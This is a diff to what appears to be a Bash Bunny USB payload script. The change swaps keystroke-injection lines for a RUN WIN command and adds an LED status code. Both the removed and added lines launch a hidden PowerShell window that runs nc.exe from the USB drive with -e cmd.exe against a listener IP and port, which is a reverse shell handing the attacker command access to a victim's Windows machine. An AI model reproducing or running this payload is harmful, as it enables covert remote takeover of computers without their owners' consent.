@@ -19,6 +19,7 @@
 # | FAIL1      | Red slow blink                | Could not find the listener_port.txt file        | 
 # | FAIL2      | Red fast blink                | Could not find the listener_ip.txt file          | 
 # | FAIL3      | Red very fast blink           | Could not find the nc.exe file                   | 
+# | SPECIAL    | Cyan inverted single blink    | Incrementing the port in listener_port.txt       | 
 # | ATTACK     | Yellow single blink           | Running the VBScript                             | 
 # | FINISH     | Green blink followed by SOLID | Script is finished                               | 
 
@@ -60,14 +61,12 @@ fi
 LED ATTACK
 
 # Execute the powershell command in the run box with the appropriate variables
-QUACK GUI r
-QUACK DELAY 100
-QUACK STRING powershell -WindowStyle Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\${SWITCH_POSITION}\\nc.exe') -nv ${my_ip} ${my_port} -e cmd.exe"
-QUACK ENTER
+RUN WIN "powershell -WindowStyle Hidden \".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\${SWITCH_POSITION}\\nc.exe') -nv ${my_ip} ${my_port} -e cmd.exe\""
+
 
 # If auto_increment, then update the listener_port file
 if [ "$auto_increment" = true ] ; then   
-   LED R G B 100
+   LED SPECIAL
    echo $((my_port + 1)) > /root/udisk/payloads/${SWITCH_POSITION}/listener_port.txt
    
    # Allow the write to sync to the USB
